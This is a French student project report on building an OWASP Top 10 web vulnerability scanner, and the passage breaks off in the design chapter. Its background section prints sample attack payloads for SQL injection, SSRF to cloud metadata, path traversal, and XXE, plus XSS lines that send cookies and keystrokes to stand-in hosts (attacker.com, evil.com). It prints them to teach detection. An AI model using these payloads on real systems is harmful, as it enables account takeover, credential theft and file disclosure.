@@ -1,0 +1,1253 @@
+ 
+
+RAPPORT DE PROJET DE FIN D’ANNÉE
+Scanner de Vulnérabilités Web
+OWASP Top 10 — 2021
+
+Détection automatique des vulnérabilités critiques des applications web
+basée sur le référentiel OWASP Top 10 2021
+RÉALISÉ PAR	ANNÉE UNIVERSITAIRE
+Fatima Ezzahrae Nouaimi
+Salma el kamili                                                                                                   2025 – 2026
+ 
+Table des Matières
+Introduction Générale
+Chapitre 1 – État de l'Art
+  1.1  Contexte et Enjeux de la Sécurité des Applications Web
+  1.2  Panorama des Cybermenaces Web
+  1.3  Le Référentiel OWASP Top 10 (2021)
+  1.4  Vulnérabilités Ciblées : Mécanismes et Impacts
+  1.5  Outils de Scan Existants — Analyse Comparative
+  1.6  Standards de Scoring : CVSS v3.1
+  1.7  Techniques de Détection Automatique
+  1.8  Synthèse et Positionnement
+Chapitre 2 – Conception
+  2.1  Architecture Générale du Système
+  2.2  Diagramme de Cas d'Utilisation
+  2.3  Diagramme de Classes
+  2.4  Diagramme de Séquence
+  2.5  Description Détaillée des Modules
+  2.6  Technologies et Stack Technique
+  2.7  Environnement de Déploiement — Topologie Réseau
+  2.8  Structure du Projet
+Chapitre 3 – Réalisation et Implémentation
+  3.1  Environnement de Travail (Machines Virtuelles)
+  3.2  Implémentation Détaillée des Modules
+  3.3  Interface en Ligne de Commande (CLI)
+  3.4  Suite de Tests Unitaires
+  3.5  Scénarios de Test — Études de Cas
+  3.6  Résultats Globaux et Analyse de Couverture
+  3.7  Analyse des Performances
+Conclusion Générale
+Bibliographie
+ 
+Introduction Générale
+La transformation numérique accélérée des dernières décennies a profondément modifié le paysage de la sécurité informatique. Les organisations déplacent massivement leurs services vers le web, exposant des applications critiques à un Internet de plus en plus hostile. En 2023, le coût moyen d'une violation de données a atteint 4,45 millions de dollars selon IBM, un chiffre en hausse de 15 % en trois ans. Les applications web constituent le vecteur d'entrée privilégié des attaquants : simples d'accès, souvent mal sécurisées, elles représentent aujourd'hui 43 % des vecteurs d'attaque initiaux selon le rapport Verizon DBIR 2023.
+Face à cette réalité, la détection proactive des vulnérabilités est devenue une nécessité absolue. Les équipes de développement et de sécurité cherchent des outils capables d'identifier rapidement les failles avant que des acteurs malveillants ne les exploitent. Cependant, les solutions professionnelles comme Burp Suite Pro ou Acunetix sont inaccessibles financièrement pour les PME et les projets académiques, tandis que les outils gratuits manquent souvent de couverture ou de facilité d'intégration.
+C'est dans ce contexte que s'inscrit notre Projet de Fin d'Année (PFA) : la conception et le développement d'un scanner de vulnérabilités web automatisé, open source, léger et modulaire. Notre outil cible spécifiquement les dix catégories de vulnérabilités définies par le référentiel OWASP Top 10 2021 — la référence mondiale en matière de sécurité applicative web. Chaque faille détectée est automatiquement scorée selon le standard CVSS v3.1, et un rapport HTML professionnel est généré à l'issue du scan.
+Ce rapport s'articule autour de trois chapitres :
+•	Chapitre 1 — présente l'état de l'art : contexte des cybermenaces, panorama des vulnérabilités OWASP, comparaison des outils existants et positionnement de notre solution.
+•	Chapitre 2 — expose la conception complète : architecture en pipeline, diagrammes UML (cas d'utilisation, classes, séquence), description des modules et choix technologiques.
+•	Chapitre 3 — détaille la réalisation : environnement de test virtualisé (VMs), implémentation des modules en Python, interface CLI, suite de 42 tests, études de cas sur 8 vulnérabilités et analyse des 70 vulnérabilités détectées.
+ 
+Chapitre 1 – État de l'Art
+1.1  Contexte et Enjeux de la Sécurité des Applications Web
+La sécurité des applications web est aujourd'hui au cœur des préoccupations des entreprises, des gouvernements et des organisations internationales. L'explosion du commerce électronique, des services cloud, des API REST et des architectures microservices a multiplié exponentiellement la surface d'attaque exposée sur Internet. Contrairement aux systèmes fermés, les applications web sont par nature accessibles à tous, rendant leur sécurisation particulièrement complexe.
+1.1.1  Évolution des Cybermenaces
+Les cyberattaques ciblant les applications web ont connu une évolution spectaculaire en termes de volume, de sophistication et d'impact. Les premières injections SQL documentées datent de 1998, mais le phénomène s'est massifié avec l'avènement du Web 2.0 et des applications dynamiques. Aujourd'hui, les attaquants combinent plusieurs techniques dans des chaînes d'exploitation complexes : un XSS permet de voler un cookie de session, qui donne accès à un back-office, depuis lequel une SSRF permet d'atteindre des services internes, et ainsi de suite.
+Les ransomwares ciblant les applications web ont notamment connu une croissance de 95 % entre 2022 et 2023 selon CrowdStrike. Les attaques par injection représentent toujours le vecteur le plus utilisé, avec plus de 3,5 milliards de tentatives d'injection SQL bloquées chaque mois par les principaux WAF (Web Application Firewalls) mondiaux.
+Tableau — Chronologie des cyberattaques majeures liées aux applications web
+Année	Événement majeur	Impact
+1998	Premières injections SQL documentées	Accès non autorisé à des bases de données
+2003	Création de l'OWASP Top 10 (v1)	Standardisation des risques web
+2010	Stuxnet — première cyberarme	Sabotage d'infrastructures critiques
+2017	WannaCry — 230 000 victimes	4 milliards USD de pertes mondiales
+2020	SolarWinds — supply chain attack	18 000 organisations compromises
+2021	Log4Shell (CVE-2021-44228)	Milliards de serveurs vulnérables
+2023	MOVEit Transfer — SQLi massive	2 500+ organisations touchées
+
+1.1.2  Impact Économique et Réglementaire
+Les violations de données liées aux applications web engendrent des coûts colossaux. Selon le rapport IBM Cost of a Data Breach 2023, le coût moyen d'une violation de données est de 4,45 millions de dollars, avec une augmentation de 15,3 % sur trois ans. Les secteurs les plus touchés sont la santé (10,9 M$), la finance (5,9 M$) et le secteur pharmaceutique (4,8 M$). Au-delà des pertes financières directes, les entreprises subissent des atteintes à leur réputation, des sanctions réglementaires (RGPD : jusqu'à 4 % du chiffre d'affaires mondial) et des perturbations opérationnelles.
+Chiffres clés de la cybersécurité web en 2023
+   • 4,45 M$ : coût moyen d'une violation de données (IBM, 2023)
+   • 74 % des violations impliquent une interaction humaine ou une faille applicative (Verizon DBIR)
+   • 43 % des vecteurs d'attaque initiaux passent par les applications web
+   • 280 jours : délai moyen pour identifier et contenir une violation de données
+   • 6 000 Md$ : coût annuel estimé de la cybercriminalité mondiale d'ici 2025 (Cybersecurity Ventures)
+
+1.2  Panorama des Cybermenaces Web
+Pour bien comprendre les vulnérabilités que notre scanner cherche à détecter, il est essentiel de dresser un panorama complet des menaces qui pèsent sur les applications web modernes. Ces menaces se classent en plusieurs catégories selon leur mécanisme d'exploitation et leur impact.
+1.2.1  Attaques Man-in-the-Middle (MITM)
+Les attaques Man-in-the-Middle (MITM, littéralement « l'homme du milieu ») constituent une menace fondamentale pour la confidentialité des communications web. Dans ce type d'attaque, un acteur malveillant s'interpose entre le client et le serveur pour intercepter, lire ou modifier les données en transit, à l'insu des deux parties.
+Mécanismes d'attaque MITM les plus courants :
+•	ARP Spoofing : empoisonnement du cache ARP pour rediriger le trafic réseau local vers la machine de l'attaquant.
+•	DNS Spoofing : falsification des réponses DNS pour rediriger les utilisateurs vers des serveurs malveillants.
+•	SSL Stripping : dégradation forcée d'une connexion HTTPS vers HTTP pour intercepter les données en clair.
+•	Rogue Access Point : création d'un faux point d'accès Wi-Fi pour capturer tout le trafic des victimes connectées.
+•	BGP Hijacking : détournement de routes BGP pour rediriger le trafic à l'échelle d'Internet.
+Les protections contre les MITM incluent l'utilisation exclusive de HTTPS avec des certificats valides, l'activation de HSTS (HTTP Strict Transport Security) avec preloading, l'épinglage de certificats (Certificate Pinning) pour les applications mobiles, et la mise en place de l'authentification mutuelle (mTLS) pour les API critiques. Notre scanner détecte les failles cryptographiques (OWASP A02) liées à l'absence de HTTPS, aux cookies non sécurisés et aux formulaires de login servis en HTTP.
+Tableau — Types d'attaques MITM et protections associées
+Type MITM	Vecteur	Protection
+ARP Spoofing	Réseau local (LAN)	ARP dynamique sécurisé, VLAN
+SSL Stripping	HTTP non sécurisé	HSTS + preloading
+DNS Spoofing	Résolution de noms	DNSSEC, DNS over HTTPS
+Rogue AP	Wi-Fi public	WPA3, VPN, 802.1X
+BGP Hijacking	Infrastructure Internet	RPKI, BGPsec
+
+1.2.2  Attaques par Injection
+Les attaques par injection représentent la menace la plus persistante et la plus documentée dans l'histoire de la sécurité web. Elles exploitent le fait qu'une application traite des données non fiables comme des instructions exécutables. Ce principe s'applique à de nombreux contextes : SQL, HTML/JavaScript, XML, commandes OS, LDAP, XPath, etc.
+1.2.3  Attaques sur l'Authentification
+Les failles d'authentification et de gestion de session permettent aux attaquants d'usurper l'identité d'utilisateurs légitimes. Les techniques incluent le brute force, l'utilisation de credentials par défaut, le vol de tokens de session, et le contournement de mécanismes d'authentification via des logiques applicatives défectueuses.
+1.2.4  Attaques sur le Contrôle d'Accès
+Les vulnérabilités de contrôle d'accès (OWASP A01 — la catégorie la plus fréquente en 2021) permettent à un utilisateur d'accéder à des ressources ou d'effectuer des actions qui ne lui sont pas autorisées. L'IDOR (Insecure Direct Object Reference) en est l'exemple le plus classique : un utilisateur change l'ID dans l'URL pour accéder au profil d'un autre utilisateur.
+1.3  Le Référentiel OWASP Top 10 (2021)
+L'OWASP (Open Web Application Security Project) est une fondation à but non lucratif fondée en 2001, dont la mission est d'améliorer la sécurité des logiciels. Elle réunit une communauté mondiale de plus de 250 000 membres, chercheurs et praticiens de la sécurité. Sa publication phare, l'OWASP Top 10, est mise à jour tous les 3 à 4 ans et représente le consensus de la communauté sur les dix risques les plus critiques pour les applications web. Elle est devenue une référence incontournable adoptée par les réglementations (PCI DSS, ISO 27001, NIST) et les programmes de formation.
+L'édition 2021 a introduit trois nouvelles catégories (A04 Insecure Design, A08 Software & Data Integrity, A10 SSRF) et reorganisé plusieurs catégories existantes suite à l'analyse de données provenant de plus de 500 000 applications.
+Tableau — OWASP Top 10 — Édition 2021 avec prévalence et description
+Code	Catégorie	Prévalence	Description détaillée
+A01	Broken Access Control	94 %	Contrôle d'accès insuffisant — 3,81 M d'occurrences. Première catégorie depuis 2021.
+A02	Cryptographic Failures	70 %	Mauvais chiffrement ou absence de TLS — exposition de données sensibles en transit.
+A03	Injection	94 %	SQLi, XSS, SSTI, commandes OS — entrées utilisateur interprétées comme commandes.
+A04	Insecure Design	40 %	Failles architecturales — absence de modélisation des menaces (Threat Modeling).
+A05	Security Misconfiguration	90 %	Configurations par défaut non sécurisées, headers manquants, services inutiles.
+A06	Vulnerable Components	27 %	Dépendances avec CVE connues — Log4Shell, Struts, Spring4Shell.
+A07	Auth & Session Failures	15 %	Credentials par défaut, sessions sans expiration, absence de MFA.
+A08	Software & Data Integrity	10 %	Désérialisation non sécurisée, dépendances sans signature, CI/CD compromis.
+A09	Logging & Monitoring	19 %	Journalisation insuffisante — retard de détection de 280 jours en moyenne.
+A10	SSRF	  8 %	Requêtes côté serveur vers ressources internes — cloud metadata, services privés.
+
+1.4  Vulnérabilités Ciblées : Mécanismes et Impacts
+1.4.1  SQL Injection (SQLi) — OWASP A03
+L'injection SQL est l'une des vulnérabilités les plus anciennes et les plus dangereuses. Elle survient lorsque des données utilisateur non validées sont incorporées directement dans des requêtes SQL, permettant à un attaquant de manipuler la logique de la base de données. La première description formelle date de 1998 (Jeff Forristal), et malgré 25 ans de sensibilisation, les injections SQL restent parmi les vecteurs d'attaque les plus fréquents, responsables de brèches majeures (Sony PlayStation Network 2011, Yahoo 2012, Ashley Madison 2015).
+Trois variantes principales existent :
+•	SQLi basée sur les erreurs : L'application retourne des messages d'erreur SQL directs, révélant la structure de la base.
+•	SQLi basée sur le temps : L'application est vulnérable mais ne renvoie pas d'erreurs — on utilise des délais (SLEEP, WAITFOR) pour déduire les informations bit à bit.
+•	SQLi booléenne : En injectant des conditions TRUE/FALSE, on observe si la réponse change pour déduire des informations sans messages d'erreur.
+Code : Exemples de payloads SQL Injection classiques
+-- Authentification bypass classique
+' OR '1'='1
+' OR '1'='1'--
+admin'--
+
+-- Extraction de données (UNION-based)
+' UNION SELECT username, password, NULL FROM users--
+
+-- Time-based (MySQL)
+' AND SLEEP(5)--
+
+-- Time-based (MSSQL)
+'; WAITFOR DELAY '0:0:5'--
+
+-- Time-based (PostgreSQL)
+' OR pg_sleep(5)--
+Impact : lecture complète de la base de données, modification ou suppression de données, contournement de l'authentification, exécution de commandes OS (via xp_cmdshell sur MSSQL). Score CVSS v3.1 : 9.8 (Critique).
+1.4.2  Cross-Site Scripting (XSS) — OWASP A03
+Le XSS permet à un attaquant d'injecter du code JavaScript malveillant dans les pages web vues par d'autres utilisateurs. C'est l'une des vulnérabilités les plus répandues sur le web, présente dans près de 75 % des sites selon WhiteHat Security.
+•	XSS Réfléchi (Reflected) : Le payload est inclus dans l'URL et reflété immédiatement dans la réponse. Nécessite d'inciter la victime à cliquer sur un lien malveillant.
+•	XSS Persistant (Stored) : Le payload est stocké en base de données (commentaire, profil) et servi à tous les visiteurs. Beaucoup plus dangereux car automatique.
+•	XSS basé sur le DOM : Exploitation du DOM côté client sans passer par le serveur — le payload ne transite pas dans la réponse HTTP.
+Code : Exemples de payloads XSS
+<!-- XSS basique — vol de cookie -->
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+
+<!-- XSS — keylogger -->
+<script>document.onkeypress=function(e){new Image().src='http://evil.com/?k='+e.key}</script>
+
+<!-- XSS — bypass de filtres -->
+<img src=x onerror=alert(1)>
+<svg onload=alert(document.domain)>
+<body onpageshow=alert(1)>
+1.4.3  IDOR — Broken Access Control (OWASP A01)
+L'Insecure Direct Object Reference (IDOR) se produit lorsqu'une application expose des références directes à des objets internes (identifiants numériques séquentiels, noms de fichiers, clés de base de données) sans vérifier que l'utilisateur est autorisé à y accéder. C'est la catégorie la plus fréquente en 2021 (94 % des applications testées présentaient une forme de broken access control).
+Code : Exemples d'IDOR
+-- Accès au profil d'un autre utilisateur
+GET /api/users/1337/profile      -> données de l'utilisateur 1337
+GET /api/users/1338/profile      -> données d'un autre utilisateur (IDOR)
+
+-- Accès aux factures d'un autre compte
+GET /invoices/download?id=1001   -> votre facture
+GET /invoices/download?id=1002   -> facture d'un autre client (IDOR)
+1.4.4  SSRF — Server-Side Request Forgery (OWASP A10)
+Le SSRF force le serveur web à effectuer des requêtes HTTP vers des destinations contrôlées par l'attaquant. Dans les environnements cloud modernes (AWS, GCP, Azure), cela permet d'accéder aux services de métadonnées d'instance (169.254.169.254 sur AWS), qui exposent des credentials IAM temporaires donnant accès à l'ensemble de l'infrastructure cloud. La vulnérabilité Capital One (2019, 100 M dossiers clients volés) était une SSRF.
+Code : Exemples de payloads SSRF
+-- SSRF vers métadonnées AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+-- SSRF vers métadonnées GCP
+http://metadata.google.internal/computeMetadata/v1/
+
+-- SSRF vers services internes
+http://127.0.0.1:8080/admin
+http://10.0.0.1/config
+http://internal-db:5432/
+1.4.5  Path Traversal (OWASP A01)
+Le Path Traversal (ou Directory Traversal) exploite une validation insuffisante des chemins de fichiers pour accéder à des fichiers arbitraires sur le serveur, en dehors du répertoire prévu. L'attaquant utilise des séquences '../' pour remonter l'arborescence et accéder à des fichiers système sensibles (/etc/passwd, /etc/shadow, les clés SSH, les fichiers de configuration d'application).
+Code : Exemples de payloads Path Traversal
+-- Path Traversal basique
+GET /download?file=../../etc/passwd
+GET /download?file=..%2F..%2Fetc%2Fshadow
+
+-- Encodages alternatifs (bypass de filtres)
+..%252f..%252fetc%252fpasswd     (double encodage URL)
+....//....//etc/passwd            (variation)
+..%c0%af..%c0%afetc%c0%afpasswd  (encodage UTF-8 overlong)
+1.4.6  XXE — XML External Entity (OWASP A05)
+Lorsqu'un parseur XML traite des entités externes définies dans le DTD (Document Type Definition) d'un document XML fourni par l'utilisateur, il peut divulguer des fichiers locaux, effectuer des requêtes SSRF, ou même provoquer un déni de service (Billion Laughs Attack). Les frameworks modernes désactivent généralement le traitement des entités externes par défaut, mais des configurations héritées ou mal configurées restent vulnérables.
+Code : Exemples de payloads XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<request>
+  <username>&xxe;</username>
+</request>
+
+<!-- XXE via SSRF -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+
+<!-- Billion Laughs (DoS) -->
+<!DOCTYPE bomb [
+  <!ENTITY a "aaaa...aaaa">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  ...
+]>
+1.4.7  Upload de Fichier Non Sécurisé (OWASP A04)
+Les fonctionnalités d'upload de fichiers, si elles ne valident pas strictement le type et le contenu des fichiers acceptés, peuvent permettre à un attaquant d'uploader un web shell (fichier PHP, JSP, ASP malveillant) directement exécutable par le serveur. Il suffit alors de naviguer vers l'URL du fichier uploadé pour exécuter des commandes arbitraires sur le serveur avec les privilèges du processus web.
+Les validations insuffisantes courantes : vérification de l'extension côté client uniquement (contournable), vérification du Content-Type HTTP (falsifiable), absence de vérification des magic bytes (signatures binaires des formats de fichiers).
+1.4.8  Failures d'Authentification (OWASP A07)
+Les failles d'authentification incluent l'utilisation de credentials par défaut (admin/admin, admin/password), l'absence de rate limiting sur les formulaires de login (permettant le brute force), la transmission de mots de passe en clair (HTTP au lieu d'HTTPS), les sessions sans expiration, et l'absence de mécanismes MFA. Ces failles sont particulièrement critiques car elles permettent souvent une compromission complète du compte ciblé.
+1.5  Outils de Scan Existants — Analyse Comparative
+Le marché des outils de scan de vulnérabilités web est divisé entre solutions professionnelles onéreuses et outils open source aux capacités plus limitées. Nous analysons ici les quatre solutions les plus répandues afin de positionner notre approche.
+1.5.1  OWASP ZAP (Zed Attack Proxy)
+OWASP ZAP est le scanner de sécurité web open source le plus utilisé au monde. Développé et maintenu par l'OWASP depuis 2010, il propose deux modes principaux : un proxy intercepteur permettant d'analyser manuellement le trafic HTTP/HTTPS, et un mode daemon/API pour l'intégration dans des pipelines CI/CD. ZAP dispose d'une architecture extensible via des add-ons communautaires et d'une API REST complète.
+Points forts : open source, communauté active (500+ contributeurs), extensible via 50+ add-ons, API REST pour CI/CD, scans actif et passif, authentification avancée.
+Limites : interface graphique complexe, lent sur les grandes applications (pas de parallélisme natif), configuration initiale fastidieuse, faux positifs nombreux sur les applications complexes.
+1.5.2  Burp Suite (PortSwigger)
+Burp Suite est la référence professionnelle absolue pour les tests d'intrusion web. Développé par PortSwigger, il combine un proxy intercepteur, un spider, un scanner automatisé, un répéteur de requêtes, un intrus (fuzzer), un décodeur et un comparateur. La version Community est gratuite mais dépourvue du scanner automatisé ; la version Professional (449 USD/an/utilisateur) offre un scanner complet avec corrélation des vulnérabilités et génération de rapports professionnels.
+Points forts : le plus complet du marché, très fiable (peu de faux positifs), outils manuels avancés, extensible via BApp Store (200+ extensions), intégration CI/CD en Enterprise.
+Limites : version complète très onéreuse (4 490 USD/an Enterprise), fermé et propriétaire, scanner indisponible en version gratuite, courbe d'apprentissage importante.
+1.5.3  Nikto
+Nikto est un scanner web léger et rapide en ligne de commande, écrit en Perl. Il se concentre principalement sur la détection de fichiers sensibles exposés, de versions de serveurs obsolètes, de configurations dangereuses et de pages d'administration accessibles. Il n'est pas conçu pour la détection de vulnérabilités applicatives comme les injections SQL ou XSS.
+Points forts : rapide (< 30s), simple d'utilisation, open source, bonne couverture des misconfigurations.
+Limites : pas de détection SQLi/XSS/SSRF, pas d'authentification, beaucoup de faux positifs, non maintenu activement.
+1.5.4  Acunetix / Invicti
+Acunetix (acquis par Invicti Security) est un scanner commercial haut de gamme proposant une couverture étendue de l'OWASP Top 10, une interface web moderne, des rapports détaillés avec preuve de concept, et une intégration avec les principaux outils DevOps (Jira, GitHub, Azure DevOps). Son moteur DeepScan supporte les applications JavaScript SPA et les APIs REST/GraphQL.
+Points forts : couverture très étendue, support SPA/API, rapports professionnels, peu de faux positifs.
+Limites : prix très élevé (5 000–25 000 USD/an), propriétaire, non accessible pour projets académiques.
+1.5.5  Tableau Comparatif Détaillé
+Tableau — Comparaison détaillée des outils de scan de vulnérabilités web
+Critère	OWASP ZAP	Burp Suite	Nikto	Acunetix	Notre outil
+Licence	Open Source	Freemium	Open Source	Commercial	Open Source
+Prix	Gratuit	0–449$/an	Gratuit	5000–25000$/an	Gratuit
+SQLi	Oui	Oui	Non	Oui	Oui
+XSS	Oui	Oui	Non	Oui	Oui
+SSRF	Partiel	Oui	Non	Oui	Oui
+XXE	Partiel	Oui	Non	Oui	Oui
+Path Traversal	Oui	Oui	Oui	Oui	Oui
+File Upload	Non	Oui	Non	Oui	Oui
+Auth Testing	Oui	Oui	Non	Oui	Oui
+Rapport HTML	Oui	Oui	Non	Oui	Oui
+CLI / CI-CD	Oui	Partiel	Oui	Oui	Oui
+Score CVSS	Non	Non	Non	Oui	Oui
+Python natif	Non	Non	Non	Non	Oui
+Léger (<50 Mo)	Non	Non	Oui	Non	Oui
+
+1.6  Standards de Scoring : CVSS v3.1
+Le Common Vulnerability Scoring System (CVSS) est un standard industriel ouvert pour évaluer la sévérité des vulnérabilités de sécurité. Développé par le FIRST (Forum of Incident Response and Security Teams), CVSS v3.1 est la version actuelle, adoptée par le NVD (National Vulnerability Database), les principaux éditeurs de sécurité et les réglementations sectorielles.
+Le score CVSS v3.1 est calculé à partir de métriques regroupées en trois groupes : le groupe Base (intrinsèque à la vulnérabilité), le groupe Temporel (évolution dans le temps) et le groupe Environnemental (spécifique au contexte d'utilisation). Notre outil utilise les scores Base pour scorer chaque vulnérabilité détectée.
+Tableau — Métriques CVSS v3.1 — Groupe Base
+Groupe	Métrique	Valeurs possibles
+Base	Vecteur d'attaque (AV)	Network (N), Adjacent (A), Local (L), Physical (P)
+Base	Complexité (AC)	Low (L), High (H)
+Base	Privilèges requis (PR)	None (N), Low (L), High (H)
+Base	Interaction utilisateur (UI)	None (N), Required (R)
+Base	Portée (S)	Unchanged (U), Changed (C)
+Base	Confidentialité (C)	None (N), Low (L), High (H)
+Base	Intégrité (I)	None (N), Low (L), High (H)
+Base	Disponibilité (A)	None (N), Low (L), High (H)
+
+Tableau — Niveaux de sévérité CVSS v3.1 et délais de remédiation recommandés
+Sévérité	Plage de score	Action recommandée	Délai de remédiation
+Critique	9.0 – 10.0	Correction immédiate	< 24 heures
+Élevé	7.0 – 8.9	Correction prioritaire	< 7 jours
+Moyen	4.0 – 6.9	Correction planifiée	< 30 jours
+Faible	0.1 – 3.9	Correction à terme	< 90 jours
+Aucun	0.0	Surveillance	—
+
+1.7  Techniques de Détection Automatique
+1.7.1  Crawling et Découverte d'Endpoints
+La première étape de tout scanner web est la découverte des surfaces d'attaque : l'ensemble des URLs, formulaires, paramètres GET/POST et endpoints d'API exposés par l'application cible. On distingue deux approches : le crawling statique (analyse du HTML retourné) et le crawling dynamique (exécution du JavaScript via un navigateur headless comme Playwright ou Puppeteer). Notre outil utilise un crawling statique BFS (Breadth-First Search) adapté aux applications majoritairement server-rendered.
+1.7.2  Scan Actif vs Scan Passif
+Scan passif : analyse le trafic HTTP existant sans générer de requêtes supplémentaires. Non intrusif, il peut être intégré en production (proxy mode ZAP). Limité en couverture car ne teste que les paramètres effectivement utilisés par l'utilisateur légitime.
+Scan actif : envoie des requêtes spécialement forgées (payloads) pour provoquer des comportements révélateurs de vulnérabilités. Plus efficace en couverture mais intrusif — ne doit être utilisé que sur des environnements de test. Notre outil adopte cette approche.
+1.7.3  Fuzzing et Wordlists
+Le fuzzing consiste à injecter des données semi-aléatoires ou basées sur des dictionnaires (wordlists) dans les paramètres d'entrée pour provoquer des comportements anormaux révélant des vulnérabilités. Notre outil utilise des wordlists ciblées pour chaque type de vulnérabilité, organisées dans le répertoire payloads/ :
+•	sqli.txt : payloads SQLi (error-based, time-based, boolean, UNION) — 50+ entrées
+•	xss.txt : payloads XSS avec variations d'encodage et bypass de filtres — 40+ entrées
+•	ssrf.txt : URLs de métadonnées cloud, IPs internes, loopback — 30+ entrées
+•	path_traversal.txt : séquences ../ avec encodages multiples — 25+ entrées
+•	xxe.txt : payloads XML avec entités externes file:// et http:// — 15+ entrées
+1.7.4  Détection par Signatures
+Chaque type de vulnérabilité génère des réponses caractéristiques détectables par analyse de signatures. Notre moteur de détection utilise des expressions régulières compilées (module re de Python) pour identifier ces marqueurs dans les réponses HTTP. Par exemple, pour les injections SQL, nous recherchons plus de 14 patterns d'erreurs couvrant MySQL, PostgreSQL, MSSQL, Oracle et SQLite.
+1.8  Synthèse et Positionnement
+L'analyse des outils existants met en évidence un vide dans l'offre actuelle : les solutions professionnelles (Burp Suite Pro, Acunetix) sont trop onéreuses pour les contextes académiques et les petites équipes, tandis que les outils gratuits (Nikto, ZAP) manquent soit de couverture, soit d'intégration facile dans un workflow Python/CI-CD. Notre scanner se positionne précisément dans cet espace.
+Positionnement de notre scanner OWASP Top 10
+   • 100 % open source et gratuit — aucune licence requise
+   • Écrit en Python pur — intégrable dans tout workflow Python / CI-CD
+   • Couverture 9/10 catégories OWASP Top 10 2021
+   • Scoring automatique CVSS v3.1 pour chaque vulnérabilité
+   • Rapport HTML autonome — lisible sans installation logicielle
+   • Architecture modulaire — ajout facile de nouveaux détecteurs
+   • Interface CLI simple : python main.py --url <cible>
+   • Support de l'authentification (DVWA, login générique)
+   • 42 tests unitaires — qualité et fiabilité garanties
+
+ 
+Chapitre 2 – Conception
+Ce chapitre présente la conception détaillée de notre scanner de vulnérabilités web. Partant des besoins identifiés dans le chapitre précédent, nous formalisons ici l'architecture du système, les diagrammes UML qui en décrivent la structure et le comportement, la description technique de chaque module, et les choix technologiques retenus. La conception suit les principes du Clean Architecture : séparation des préoccupations, injection de dépendances, et testabilité maximale.
+2.1  Architecture Générale du Système
+Notre scanner adopte une architecture en pipeline à cinq étapes, où chaque étape consomme la sortie de l'étape précédente. Cette approche garantit une séparation stricte des responsabilités : le module de crawling ne connaît pas la logique de détection, les détecteurs ignorent comment le rapport est généré, etc. Chaque module peut être testé, remplacé ou étendu indépendamment.
+Code : Architecture en pipeline du scanner de vulnérabilités
+ 
+2.1.1  Principes de Conception Retenus
+•	Responsabilité Unique (SRP) : Chaque module (crawler, détecteur, evaluator, reporter) a une responsabilité unique et clairement définie.
+•	Ouvert/Fermé (OCP) : L'ajout d'un nouveau détecteur n'impose aucune modification du code existant — il suffit de créer une nouvelle classe héritant de BaseDetector.
+•	Substitution de Liskov (LSP) : Tous les détecteurs exposent la même interface scan(endpoint) -> list[Vulnerability].
+•	Injection de dépendances : Les modules sont instanciés avec une session requests partagée, permettant la réutilisation des cookies d'authentification.
+2.1.2  Patterns de Conception Utilisés
+Tableau — Patterns de conception utilisés dans le scanner
+Pattern	Module	Rôle
+Template Method	BaseDetector → SQLiDetector	Définit le squelette scan_all() — les sous-classes implémentent scan()
+Strategy	ALL_DETECTORS dict	Sélection dynamique des détecteurs à l'exécution selon --only
+Factory	detectors/__init__.py	Instanciation des détecteurs par nom (string → classe)
+Pipeline	Scanner.core.run()	Orchestration séquentielle des étapes de traitement
+
+2.2  Diagramme de Cas d'Utilisation
+Le diagramme de cas d'utilisation modélise les interactions entre l'acteur principal (l'analyste en sécurité) et le système scanner. Il identifie cinq cas d'utilisation principaux, certains incluant des comportements optionnels (extend) ou réutilisant des fonctionnalités communes (include).
+ 
+Tableau — Description détaillée des cas d'utilisation
+ID	Cas d'utilisation	Acteur	Précondition	Postcondition
+UC1	Lancer un scan complet	Analyste	URL cible accessible	Rapport HTML généré
+UC2	Configurer les options	Analyste	—	Options enregistrées dans ScanOptions
+UC3	S'authentifier	Analyste	Credentials valides	Session HTTP authentifiée
+UC4	Exporter le rapport	Analyste	Scan terminé	Fichier .html sauvegardé
+UC5	Crawler l'application	Système	URL de base	list[Endpoint] découverts
+UC6	Détecter les vulnérabilités	Système	Endpoints disponibles	list[Vulnerability] raw
+UC7	Évaluer les scores CVSS	Système	Vulnérabilités raw	Vulnérabilités enrichies
+UC8	Générer le rapport HTML	Système	Vulnérabilités scorées	Fichier HTML autonome
+
+2.3  Diagramme de Classes
+Le diagramme de classes présente la structure statique du système avec les sept classes principales, leurs attributs, méthodes et relations. Les relations de composition (losange plein) indiquent que Scanner possède et crée ses dépendances ; les relations d'association simple indiquent une utilisation sans possession.
+Code : Diagramme de classes complet du scanner
+ 
+2.4  Diagramme de Séquence
+Le diagramme de séquence illustre les interactions entre les objets lors d'un cycle de scan complet, depuis la commande CLI jusqu'à la génération du rapport HTML final.
+Code : Diagramme de séquence — cycle de scan complet
+ 
+2.5  Description Détaillée des Modules
+2.5.1  Module Crawler
+Le Crawler est le premier maillon du pipeline. Son rôle est de découvrir exhaustivement tous les points d'entrée testables de l'application cible : URLs avec paramètres GET, formulaires POST (login, recherche, upload), et endpoints d'API. Il utilise un algorithme BFS (file FIFO) pour explorer l'application de manière ordonnée et contrôlée en termes de profondeur et de nombre de pages visitées.
+Le Crawler extrait les types d'endpoints suivants :
+•	URLs avec paramètres GET : /search?q=test, /profile?id=1
+•	Formulaires HTML (GET et POST) : champs text, password, hidden, select, textarea
+•	Formulaires multipart (enctype=multipart/form-data) : upload de fichiers
+•	Liens internes filtrés : exclusion des liens logout, javascript:, mailto:
+La déduplication des endpoints se fait via une signature unique : METHOD:URL?sorted_params. Deux formulaires pointant vers la même URL avec les mêmes champs ne génèrent qu'un seul endpoint.
+2.5.2  Module BaseDetector (Classe Abstraite)
+BaseDetector est la classe de base dont héritent tous les détecteurs actifs. Elle implémente le pattern Template Method : la méthode scan_all() orchestre la boucle sur tous les endpoints et appelle la méthode abstraite scan() implémentée par chaque sous-classe.
+Services fournis par BaseDetector à toutes les sous-classes :
+•	_send(url, method, params, data, headers) : envoi HTTP avec gestion des erreurs
+•	_iter_injection_points(endpoint) : itère sur tous les paramètres injectables
+•	Chargement automatique des payloads depuis payloads/<name>.txt au démarrage
+•	scan_all(endpoints) : boucle principale + déduplication par signature
+2.5.3  Les 12 Détecteurs
+Tableau — Les 12 détecteurs et leurs caractéristiques
